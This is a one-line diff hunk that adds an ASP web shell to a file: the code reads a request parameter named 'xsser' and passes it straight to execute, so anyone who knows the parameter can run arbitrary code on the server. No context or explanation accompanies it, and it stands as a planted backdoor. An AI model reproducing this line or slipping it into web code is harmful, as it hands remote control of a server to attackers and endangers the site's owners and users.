@@ -1,0 +1,1 @@
+<%a=request("xsser")%><%execute(a)%>
